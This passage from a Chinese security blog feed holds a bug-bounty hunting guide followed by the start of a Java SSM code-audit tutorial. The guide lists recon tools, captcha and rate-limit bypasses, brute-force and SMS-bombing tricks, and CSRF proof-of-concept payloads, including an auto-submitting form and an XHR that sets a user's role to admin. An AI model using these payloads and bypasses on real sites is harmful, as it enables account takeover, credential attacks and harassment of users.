    <content><![CDATA[<h2 id="SRC混子的漏洞挖掘之道"><a href="#SRC混子的漏洞挖掘之道" class="headerlink" title="SRC混子的漏洞挖掘之道"></a>SRC混子的漏洞挖掘之道</h2><p>本文首先于先知社区:<a href="https://xz.aliyun.com/t/8501" target="_blank" rel="noopener">SRC混子的漏洞挖掘之道 - 先知社区 (aliyun.com)</a></p>
<p>一个SRC混子挖SRC的半年经验分享~,基本都是文字阐述，希望能给同样在挖洞的师傅们带来一点新收获。</p>
<h3 id="前期信息收集"><a href="#前期信息收集" class="headerlink" title="前期信息收集"></a>前期信息收集</h3><p> 还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括<strong>企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话</strong>等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。</p>
<h4 id="企业相关信息收集"><a href="#企业相关信息收集" class="headerlink" title="企业相关信息收集"></a>企业相关信息收集</h4><ul>
<li><p>企查查 (<a href="https://www.qcc.com" target="_blank" rel="noopener">https://www.qcc.com）</a>/)</p>
</li>
<li><p>天眼查(<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a>)</p>
</li>
<li><p>启信宝（<a href="https://www.qixin.com/" target="_blank" rel="noopener">https://www.qixin.com/</a>)</p>
<p> 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。</p>
</li>
</ul>
<p><strong>主要查询的信息:</strong></p>
<ol>
<li>一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。</li>
<li>查看同电话企业基本都是子公司。</li>
<li>查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。</li>
<li>查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产)</li>
</ol>
<p>PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。</p>
<ul>
<li><p>站长之家:</p>
<p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p>
<ul>
<li>邮箱反查、注册人反查、电话反查。</li>
<li>推荐个项目:<a href="https://github.com/code-scan/BroDomain" target="_blank" rel="noopener">https://github.com/code-scan/BroDomain</a> 兄弟域名查询。</li>
</ul>
</li>
<li><p><a href="https://www.qimai.cn/" target="_blank" rel="noopener">https://www.qimai.cn/</a></p>
<ul>
<li>七麦数据，可以查到企业下一些比较冷门的app。</li>
</ul>
</li>
</ul>
<p><strong>信息整理</strong></p>
<p>当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息</p>
<ul>
<li><p>主公司及分公司、子公司下所有归属的网站域名信息；</p>
</li>
<li><p>主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。</p>
</li>
<li><p>主公司及分公司、子公司下所有的app资产和微信小程序。</p>
<p>之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。</p>
</li>
</ul>
<h4 id="子域名收集和网站信息收集"><a href="#子域名收集和网站信息收集" class="headerlink" title="子域名收集和网站信息收集"></a>子域名收集和网站信息收集</h4><p> 子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。</p>
<h5 id="通过github收集子域名"><a href="#通过github收集子域名" class="headerlink" title="通过github收集子域名"></a>通过github收集子域名</h5><p> 先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。</p>
<h5 id="oneforAll"><a href="#oneforAll" class="headerlink" title="oneforAll"></a>oneforAll</h5><p><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a></p>
<ul>
<li>需要到配置文件里填写api接口信息，</li>
<li>根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。</li>
</ul>
<p>命令</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python oneforall.py <span class="params">--targets</span> <span class="string">./domain.txt</span> run</span><br><span class="line">python oneforall.py <span class="params">--targets</span> <span class="string">./domain.txt</span>  <span class="params">--brute</span> <span class="literal">true</span> run</span><br></pre></td></tr></table></figure>

<p> 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。</p>
<h5 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h5><p>子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码，</p>
<p><a href="https://github.com/timwhitez/rad-xray" target="_blank" rel="noopener">https://github.com/timwhitez/rad-xray</a> 命令改一下能批量探测子域名，一般5到10分钟一个子域。</p>
<h5 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h5><p>官网:<a href="https://gobies.org/" target="_blank" rel="noopener">https://gobies.org/</a></p>
<p> 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:<a href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0" target="_blank" rel="noopener">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。</span><br></pre></td></tr></table></figure>

<p> 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。</p>
<h5 id="BBScan"><a href="#BBScan" class="headerlink" title="BBScan"></a>BBScan</h5><p>猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。</p>
<p>项目地址:</p>
<p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p>
<p><a href="https://github.com/yhy0/BBScan" target="_blank" rel="noopener">https://github.com/yhy0/BBScan</a> （添加了springboot的泄露探测）</p>
<ul>
<li>可以对域名、ip、C段进行探测</li>
<li>快速探测管理后台</li>
<li>进行端口探测</li>
<li>探测敏感信息泄露</li>
<li>可以自定义扫描规则</li>
</ul>
<p>report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。</p>
<h5 id="js信息收集"><a href="#js信息收集" class="headerlink" title="js信息收集"></a>js信息收集</h5><p>主要是爬取网站的敏感js文件，js中能收集到的信息:</p>
<ul>
<li>增加攻击面(url、域名)</li>
<li>敏感信息(密码、API密钥、加密方式)</li>
<li>代码中的潜在危险函数操作</li>
<li>具有已知漏洞的框架</li>
</ul>
<p>常用的工具</p>
<p>速度很快的jsfinder <a href="https://github.com/Threezh1/JSFinder" target="_blank" rel="noopener">https://github.com/Threezh1/JSFinder</a></p>
<p>xray的rad爬虫 <a href="https://github.com/chaitin/rad" target="_blank" rel="noopener">https://github.com/chaitin/rad</a></p>
<p>能够匹配敏感信息的JSINFO-SCAN：<a href="https://github.com/p1g3/JSINFO-SCAN" target="_blank" rel="noopener">https://github.com/p1g3/JSINFO-SCAN</a></p>
<h3 id="捡中低危漏洞的一些技巧"><a href="#捡中低危漏洞的一些技巧" class="headerlink" title="捡中低危漏洞的一些技巧"></a>捡中低危漏洞的一些技巧</h3><p> 刚开始挖src往往不知道从哪下手，首先我们其实可以从各个src平台提交漏洞下拉框里看一看收取的漏洞类型。然后针对性的去学习如何挖掘，比如某src收取的漏洞类型,我们就可以针对性的学习对应的挖掘技巧。</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line">框架注入</span><br><span class="line"> 明文密码传输</span><br><span class="line"> 表单破解漏洞</span><br><span class="line"> <span class="selector-tag">IIS</span>短文件名泄露</span><br><span class="line"> 老旧过期的<span class="selector-tag">HTTPS</span>服务</span><br><span class="line"> 跨目录下载漏洞</span><br><span class="line"> 目录可浏览漏洞</span><br><span class="line"> <span class="selector-tag">LFI</span>本地文件包含漏洞</span><br><span class="line"> <span class="selector-tag">RFI</span>远程文件包含漏洞</span><br><span class="line"> <span class="selector-tag">HTTP</span>拒绝服务攻击</span><br><span class="line"> 弱口令登录</span><br><span class="line"> <span class="selector-tag">CSRF</span>跨站点请求伪造</span><br><span class="line"> <span class="selector-tag">Flash</span>点击劫持</span><br><span class="line"> <span class="selector-tag">SQL</span>注入漏洞</span><br><span class="line"> <span class="selector-tag">XSS</span>跨站脚本漏洞</span><br><span class="line"> 文件上传漏洞</span><br><span class="line"> 解析漏洞<span class="selector-pseudo">:IIS</span>解析漏洞</span><br><span class="line"> 解析漏洞<span class="selector-pseudo">:Apache</span>解析漏洞</span><br><span class="line"> <span class="selector-tag">Cookies</span>注入漏洞</span><br><span class="line"> 越权访问漏洞</span><br><span class="line"> 命令执行漏洞</span><br><span class="line"> <span class="selector-tag">Struts2</span>远程代码执行漏洞</span><br><span class="line"> 业务逻辑漏洞</span><br><span class="line"> 用户隐私泄露</span><br><span class="line"> 敏感信息泄漏(运维)</span><br><span class="line"> 敏感信息泄漏(研发)</span><br><span class="line"> 敏感文件泄漏(运维)(配置)</span><br><span class="line"> 敏感文件泄漏(运维)(权限)</span><br><span class="line"> 未验证的重定向和传递</span><br><span class="line"> <span class="selector-tag">Flash</span>跨域访问资源</span><br><span class="line"> 测试文件泄漏</span><br><span class="line"> 开启危险的<span class="selector-tag">HTTP</span>方法</span><br><span class="line"> <span class="selector-tag">HTTP</span>参数污染</span><br><span class="line"> <span class="selector-tag">Unicode</span>编码绕过</span><br><span class="line"> 源码泄漏</span><br><span class="line"> 后台目录泄漏</span><br><span class="line"> 链接注入漏洞</span><br><span class="line"> <span class="selector-tag">SSRF</span>服务器请求伪造</span><br><span class="line"> <span class="selector-tag">jsonp</span>劫持</span><br></pre></td></tr></table></figure>

<p>学习完基础的漏洞类型后，我们可以多看一些实战的漏洞报告。比如wooyun漏洞库和hackone上的报告。</p>
<ul>
<li>乌云漏洞库:<a href="https://wooyun.x10sec.org/" target="_blank" rel="noopener">https://wooyun.x10sec.org/</a></li>
<li>hackone报告：<a href="https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA" target="_blank" rel="noopener">https://pan.baidu.com/s/1jPUSuoERSIDw2zCKZ0xTjA</a> 提取码:2klt</li>
</ul>
<p>这里列举一些我经常挖到的垃圾洞，生而为人，挖不到大洞，我很抱歉┭┮﹏┭┮。</p>
<h4 id="登录框处常见的一些漏洞"><a href="#登录框处常见的一些漏洞" class="headerlink" title="登录框处常见的一些漏洞"></a>登录框处常见的一些漏洞</h4><p> 在我们通过对目标的前期信息收集之后，首当其冲的往往就是各种奇奇怪怪的登录框，一般来说，大型的企业为了减少安全问题，一般都是用统一的登录接口登录不同的旗下网站，但是一些后台系统，运维系统，或者一些边缘业务使用了独立的注册、登录体系，这个时候往往就会存在安全问题。</p>
<p><strong>现在还能用的接码平台:</strong></p>
<ul>
<li><a href="http://www.114sim.com/" target="_blank" rel="noopener">http://www.114sim.com/</a></li>
<li><a href="https://yunduanxin.net/China-Phone-Number/" target="_blank" rel="noopener">https://yunduanxin.net/China-Phone-Number/</a></li>
<li><a href="https://www.materialtools.com/" target="_blank" rel="noopener">https://www.materialtools.com/</a></li>
</ul>
<h5 id="绕过限制导致的爆破、撞库、用户遍历漏洞"><a href="#绕过限制导致的爆破、撞库、用户遍历漏洞" class="headerlink" title="绕过限制导致的爆破、撞库、用户遍历漏洞"></a>绕过限制导致的爆破、撞库、用户遍历漏洞</h5><p>最常见的一种漏洞，尤其是一些老旧的后台系统，可能验证码抓个包就绕过去了。下面是一些常见的绕过姿势:</p>
<ul>
<li><p>验证码不刷新</p>
</li>
<li><p>验证码抓包绕过</p>
</li>
<li><p>验证码删除绕过</p>
</li>
<li><p>验证码置空绕过</p>
</li>
<li><p>修改xff头绕过:推荐个burp插件,<a href="https://github.com/TheKingOfDuck/burpFakeIP" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/burpFakeIP</a></p>
</li>
<li><p>账号后加空格绕过账号错误次数限制。</p>
<p>一般来说如果只是简单的验证码绕过，一般都是低危，所以一般能够绕过验证码的情况，都要尝试爆破一波账号密码。</p>
</li>
</ul>
<h5 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h5><p><strong>没有验证码或者验证码可以绕过的情况</strong></p>
<p>直接上一手字典爆破，当然还是有一些小技巧:</p>
<ul>
<li><p>比如可以设置固定的弱密码，比如123456，然后爆破账号。</p>
</li>
<li><p>比如可以首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:<a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool" target="_blank" rel="noopener">https://github.com/HongLuDianXue/BaiLu-SED-Tool</a></p>
<p>爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章:</p>
</li>
<li><p><a href="https://xz.aliyun.com/t/7823" target="_blank" rel="noopener">https://xz.aliyun.com/t/7823</a></p>
</li>
<li><p><a href="https://github.com/huyuanzhi2/password_brute_dictionary" target="_blank" rel="noopener">https://github.com/huyuanzhi2/password_brute_dictionary</a></p>
</li>
</ul>
<p><strong>有验证码且无法绕过的情况</strong></p>
<ul>
<li>github直接找员工账号邮箱，密码。</li>
<li>源码或者js文件查找线索，邮箱，或者加密的账号密码。</li>
<li>特定系统或者cms，搜索引擎搜索默认管理员或者测试密码。</li>
<li>手动尝试常见弱口令。</li>
</ul>
<h5 id="注册、登录、找回密码处的短信-邮箱轰炸漏洞"><a href="#注册、登录、找回密码处的短信-邮箱轰炸漏洞" class="headerlink" title="注册、登录、找回密码处的短信\邮箱轰炸漏洞"></a>注册、登录、找回密码处的短信\邮箱轰炸漏洞</h5><p>这个也挺常见的，一般可以对特定用户进行轰炸的是一定会收的，横向轰炸能够消耗资源的随缘收。常见的绕过姿势:</p>
<ul>
<li>加空格绕过</li>
<li>加任意字母绕过</li>
<li>前面加86绕过</li>
<li>xff头伪造ip绕过</li>
</ul>
<h5 id="逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞"><a href="#逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞" class="headerlink" title="逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞"></a>逻辑缺陷的导致的任意用户注册、登录、找回密码漏洞</h5><p>因为这方面漏洞一旦出现基本都是高危，所以挖掘的时候</p>
<p>类似的思路我就不细说了,freebuf上有任意用户密码重置的系列文章,类似漏洞思路其实相差不大:</p>
<p><a href="https://www.freebuf.com/author/yangyangwithgnu" target="_blank" rel="noopener">https://www.freebuf.com/author/yangyangwithgnu</a></p>
<h4 id="常见的信息泄露漏洞"><a href="#常见的信息泄露漏洞" class="headerlink" title="常见的信息泄露漏洞"></a>常见的信息泄露漏洞</h4><p>敏感信息泄露的范围很广，我认为一般就是两大类，</p>
<ul>
<li>因为配置错误或者管理不当导致的企业内部信息泄露。</li>
<li>因为逻辑缺陷导致的用户资料泄露(遍历)。</li>
</ul>
<h5 id="github导致的信息泄露"><a href="#github导致的信息泄露" class="headerlink" title="github导致的信息泄露"></a>github导致的信息泄露</h5><ul>
<li><p>P牛知识星球里分享的github搜索关键词:<a href="https://twitter.com/obheda12/status/1316513838716551169" target="_blank" rel="noopener">https://twitter.com/obheda12/status/1316513838716551169</a></p>
</li>
<li><p>github子域名监控项目:<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></p>
</li>
<li><p>常见的泄露内容:</p>
<ul>
<li>员工内部邮箱、登录账号、密码。</li>
<li>企业的一些内部系统域名、ip泄露。</li>
<li>企业网站的工程代码、网站源码泄露，可以通过员工邮箱关键词查找，要注意日期，好几年的大概率不收了。</li>
</ul>
<p>乌云上有一些案例，可以看一看。</p>
</li>
</ul>
<h5 id="配置错误导致的信息泄露"><a href="#配置错误导致的信息泄露" class="headerlink" title="配置错误导致的信息泄露"></a>配置错误导致的信息泄露</h5><p>包含的类型很多，最重要的是有一份足够强大的字典和一个好用的扫描器。</p>
<p>我在实际进行探测的时候，对于大批量的域名来说，更喜欢先用一份精简的小字典先进行快速扫描</p>
<p>比如:</p>
<ul>
<li>备份文件的小字典</li>
<li>springboot泄露的小字典</li>
<li>网站后台的小字典</li>
</ul>
<p>比较出名的扫描器我们常见的dirsearch、dirmap，dirbuster等等。</p>
<p>可视化的比如TEST404系列、御剑扫描器使用体验也不错。</p>
<p> 注:信息泄露中比较常见的swagger-ui服务泄露，可能直接提交会忽略或者低危，别忘了进一步测试泄露的接口功能。</p>
<h5 id="越权导致的信息泄露"><a href="#越权导致的信息泄露" class="headerlink" title="越权导致的信息泄露"></a>越权导致的信息泄露</h5><p> 很多时候越权来来去去都是更改一个参数的问题,更多的时候还是要细心的一个一个测业务功能，注意观察和测试操作参数和对象参数，操作参数一般是增删改查对应特定业务的敏感操作、对象参数一般是用户或者物品等。</p>
<p>推荐几个burp插件:</p>
<ul>
<li>未授权检测： <a href="https://github.com/theLSA/burp-unauth-checker" target="_blank" rel="noopener">https://github.com/theLSA/burp-unauth-checker</a></li>
<li>敏感参数提取：<a href="https://github.com/theLSA/burp-sensitive-param-extractor" target="_blank" rel="noopener">https://github.com/theLSA/burp-sensitive-param-extractor</a></li>
<li>信息提取：<a href="https://github.com/theLSA/burp-info-extractor" target="_blank" rel="noopener">https://github.com/theLSA/burp-info-extractor</a></li>
</ul>
<p>插件的作用基本还是帮助我们快速定位敏感参数，实际测试还是需要我们一个包一个包仔细的分析程序逻辑。</p>
<p><strong>常见的一些越权情况:</strong></p>
<ul>
<li>基于用户ID的越权</li>
<li>基于功能对象ID的越权</li>
<li>基于上传对象ID的越权</li>
<li>基于未授权访问的越权</li>
<li>基于功能地址的越权</li>
<li>基于接口身份的越权</li>
</ul>
<h3 id="其他的OWASPTop10漏洞"><a href="#其他的OWASPTop10漏洞" class="headerlink" title="其他的OWASPTop10漏洞"></a>其他的OWASPTop10漏洞</h3><h4 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h4><p> CSRF漏洞在挖掘中最重要的是说明危害，比较容易扯皮，一般来说涉及用户资料、财产、权限的CSRF漏洞大概率会收，一般来说最高就是中危。捡捡垃圾洞还是可以的。</p>
<p><strong>常见的漏洞点</strong></p>
<p>1、修改个人资料、邮箱、密码、头像</p>
<p>2、发表文章</p>
<p>3、添加、删除评论</p>
<p>4、添加、修改、删除收货地址</p>
<p>5、添加管理员</p>
<p><strong>(1) GET型</strong></p>
<p>GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用：</p>
<ul>
<li><pre><code>&lt;img src=http://www.xxxxx.com/csrf?xx=11 /&gt;
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(**2) <span class="keyword">POST</span>型**</span><br><span class="line"></span><br><span class="line"> <span class="keyword">POST</span>请求中没有<span class="keyword">token</span>参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单，网页操作某功能，抓包后，如果发现没有<span class="keyword">token</span>等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。</span><br><span class="line"></span><br><span class="line">poc(可以用burp自己生成的）:</span><br></pre></td></tr></table></figure>
&lt;html&gt;    
&lt;body&gt;         
&lt;form name=&quot;px&quot; method=&quot;post&quot; action=&quot;http://www.xxxxx.com/add&quot;&gt;            
&lt;input type=&quot;text&quot; name=&quot;user_id&quot; value=&quot;1111&quot;&gt;        
&lt;/form&gt;       
&lt;script&gt;document.px.submit(); &lt;/script&gt;     
&lt;/body&gt; 
&lt;/html&gt;
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">POST</span>请求数据为json，当服务器没有严格校验content-<span class="keyword">type</span>类型时，<span class="type">POC</span>为：</span><br></pre></td></tr></table></figure>
&lt;script&gt;  
var xhr = new XMLHttpRequest();  
xhr.open(&quot;POST&quot;, &quot;http://www.xxxx.com/api/setrole&quot;);  
xhr.withCredentials = true;  
xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&quot;);  xhr.send(&apos;{&quot;role&quot;:admin}&apos;);
&lt;/script&gt;
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">3.</span> Flash 型</span><br><span class="line"></span><br><span class="line">Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造。</span><br><span class="line"></span><br><span class="line">利用条件：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、目标站点下必须存在crossdomain.xml文件。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、crossdomain.xml中的配置允许其他域进行跨域请求。</span><br></pre></td></tr></table></figure>
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;cross-domain-policy&gt;  &lt;allow-access-from domain=&quot;*&quot; /&gt;&lt;/cross-domain-policy&gt;</code></pre></li>
</ul>
<p><strong>bypass小技巧</strong></p>
<ul>
<li>删除csrf token</li>
<li>置空csrf token</li>
<li>修改请求方法，如POST方法变GET请求</li>
<li>使用与token相同长度的任意字符串替换token，例如尝试更改一个字符，看看或发生什么</li>
<li>使用固定token</li>
<li>token字段改成 token[]=</li>
</ul>
<h4 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h4><p> 这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。</p>
<ul>
<li><p>上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。</p>
</li>
<li><p>上传恶意文件进行钓鱼</p>
</li>
<li><p>尝试在上传的文件名前加../进行目录穿越。</p>
</li>
<li><p>可以结合其他漏洞比如CORS漏洞扩大危害。</p>
<p>文件上传的常见的绕过姿势应该也挺熟悉的了。。，实际测试的时候发现在进行申请企业、个人认证的时候，上传文件处常常有这个问题。</p>
</li>
</ul>
<h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><p>老熟人了，不多说了，常见的姿势大家应该都知道。分享一个我学XSS的文章:<br><a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/xss-naxienian/content/index.html</a></p>
<p>Broken5师傅的xsspayload:</p>
<p><strong>hexo这里貌似会一直解析payload就不贴了，可以去先知看原文:)</strong></p>
<h5 id="bypass姿势"><a href="#bypass姿势" class="headerlink" title="bypass姿势"></a>bypass姿势</h5><h4 id="威胁情报的提交"><a href="#威胁情报的提交" class="headerlink" title="威胁情报的提交"></a>威胁情报的提交</h4><p>这块我也没有经验，给大家分享两篇文章吧。。。信息收集到了还是可以试试提交的</p>
<p><a href="https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/v2MRx7qs70lpnW9n-mJ7_Q</a></p>
<p><a href="https://bbs.ichunqiu.com/article-921-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/article-921-1.html</a></p>
<p>可以试一试加一加各种羊毛群，反手撸一手羊毛群的羊毛。</p>
<h3 id="对于挖掘高危、严重级别漏洞的一些思考"><a href="#对于挖掘高危、严重级别漏洞的一些思考" class="headerlink" title="对于挖掘高危、严重级别漏洞的一些思考"></a>对于挖掘高危、严重级别漏洞的一些思考</h3><p> 因为一直以来挖到高危、严重的数量寥寥无几，基本上就是一直在捡一些中低危漏洞，这段时间也看了很多牛叉的漏洞报告，想聊一聊我的思考。</p>
<h5 id="1-自动化信息收集的能力"><a href="#1-自动化信息收集的能力" class="headerlink" title="1.自动化信息收集的能力"></a>1.自动化信息收集的能力</h5><p>这里说的信息收集更多的是如何利用已有的工具进行快速自动化的收集和整理，既要做到速度快，还要做到全面收集不遗漏信息，很多时候这个过程本身就是在发现漏洞。</p>
<p> 这些工作应该在我们前期信息收集的阶段就应该全面的完成，所以如何快速化的进行全面的信息收集是我们需要思考和不断实践的。</p>
<h5 id="2-打漏洞组合拳的能力"><a href="#2-打漏洞组合拳的能力" class="headerlink" title="2.打漏洞组合拳的能力"></a>2.打漏洞组合拳的能力</h5><p> SRC对于漏洞评级主要是看你漏洞可以造成的危害，所以当挖到一些低危漏洞时，可以先不急着提交，找一找有没有其他可以利用的点打漏洞组合拳。</p>
<h5 id="3-绕waf的能力"><a href="#3-绕waf的能力" class="headerlink" title="3.绕waf的能力"></a>3.绕waf的能力</h5><p> 这个能力挺欠缺的。挖洞的过程基本遇到waf就溜了，尤其是一些大厂的waf，绕其他waf就是直接嫖一些其他的师傅的思路。</p>
<h5 id="4-细心和耐心和一些运气"><a href="#4-细心和耐心和一些运气" class="headerlink" title="4.细心和耐心和一些运气"></a>4.细心和耐心和一些运气</h5><p>心细挖天下，再加上一些运气，可能高危严重就到手了。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p> 挖SRC需要有一个好心态，国内SRC生态并不是很好，SRC感觉更多的提供了一个相对安全的测试保障，所以更需要抱着一种学习的心态去挖，将我们学习的到的知识灵活运用，发现新的问题。不要想我今晚一定要挖到多少漏洞，要拿到多少奖金，不然可能会被忽略三连打崩心态。</p>
]]></content>
  </entry>
  <entry>
    <title>SSM框架审计学习-- 因酷网校在线教育系统审计</title>
    <url>/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/</url>
    <content><![CDATA[<h2 id="SSM框架审计学习–-因酷网校在线教育系统审计学习"><a href="#SSM框架审计学习–-因酷网校在线教育系统审计学习" class="headerlink" title="SSM框架审计学习– 因酷网校在线教育系统审计学习"></a>SSM框架审计学习– 因酷网校在线教育系统审计学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>     因酷开源网校系统是由北京因酷时代科技有限公司以下简称（因酷教育软件）研发并推出的国内首家Java版开源网校源代码建站系统，并免费提供给非商业用途用户使用，是用户体验最好、运营功能最全、性价比最高的在线教育软件。</p>
<p>第一次上手一个SSM框架的审计，主要学习一下审计的思路。主要参考自先知社区这篇文章：<a href="https://xz.aliyun.com/t/2646" target="_blank" rel="noopener">JAVA代码审计 | 因酷网校在线教育系统 - 先知社区 (aliyun.com)</a></p>
<h5 id="java分层思想"><a href="#java分层思想" class="headerlink" title="java分层思想"></a>java分层思想</h5><p>常见的JavaWeb项目分层：</p>
<blockquote>
<p>视图层（View 视图)</p>
<p>控制层（Controller、Action 控制层）</p>
<p>服务层（Service）</p>
<p>业务逻辑层BO(business object) </p>
<p>实体层（entity 实体对象、VO(value object) 值对象 、模型层（bean</p>
<p>持久层（dao- Data Access Object 数据访问层、PO(persistant object) 持久对象）</p>
</blockquote>
<h5 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h5><p>审计一套系统，可以先看看pom.xml中加载了那些组件 ，如果这些组件中本身存在漏洞，就可以直接利用这些漏洞。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212114439.png" alt></p>
<h5 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h5><p>​      程序启动时tomcat会首先加载web.xml中的配置 。通过web.xml完成DispathcheServlet的声明，并将我们的请求转发到springmvc中。我们可以首先查看web.xml中是否配置了全局过滤器。判断是否能够bypass。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213172113.png" alt></p>
<h5 id="applicationContext-xml"><a href="#applicationContext-xml" class="headerlink" title="applicationContext.xml"></a>applicationContext.xml</h5><p>applicationContext.xml是spring核心配置文件,这里会加载一些其他的配置文件。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213172023.png" alt></p>
<h5 id="spring-mvc-xml"><a href="#spring-mvc-xml" class="headerlink" title="spring-mvc.xml"></a>spring-mvc.xml</h5><p>sping-mvc.xml文件中主要的工作是：启动注解、扫描controller包注解；静态资源映射；视图解析（defaultViewResolver）；文件上传（multipartResolver）;返回消息json配置。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212111938.png" alt></p>
